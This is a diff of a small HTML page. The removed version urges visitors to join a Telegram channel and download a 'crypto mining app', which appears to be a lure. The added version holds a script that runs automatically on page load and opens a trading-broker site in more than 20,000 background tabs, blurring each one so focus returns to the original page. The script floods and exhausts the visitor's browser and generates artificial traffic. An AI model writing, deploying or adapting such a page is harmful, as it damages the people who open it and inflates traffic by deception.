@@ -3,45 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Join Channel & Download App</title>
-    <style>
-        body, html {
-            height: 100%;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-        }
-        .button-container {
-            text-align: center;
-        }
-        .button {
-            padding: 15px 30px;
-            font-size: 18px;
-            color: white;
-            background-color: #007bff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            text-decoration: none;
-        }
-        .button:hover {
-            background-color: #0056b3;
-        }
-        .description {
-            margin-top: 20px;
-            font-size: 16px;
-            color: #333;
-        }
-    </style>
+    <title>Open Multiple Tabs</title>
 </head>
 <body>
-    <div class="button-container">
-        <a href="https://t.me/flcfound" class="button">Click Here</a>
-        <div class="description">Click and join the channel and download the crypto mining app</div>
-    </div>
+    <h2>Opening Multiple Tabs Automatically...</h2>
+
+    <script>
+        window.onload = function() {
+            const url = "https://qxbroker.com/en/trade"; // Replace with your desired link
+            const tabCount = 20005; // Number of tabs to open
+            const delay = 100; // Delay between each tab opening (milliseconds)
+
+            for (let i = 0; i < tabCount; i++) {
+                setTimeout(() => {
+                    const win = window.open(url, '_blank');
+                    if (win) {
+                        win.blur(); // To focus back to the original window
+                    } else {
+                        console.log("Popup was blocked");
+                    }
+                }, i * delay);
+            }
+        };
+    </script>
 </body>
 </html>
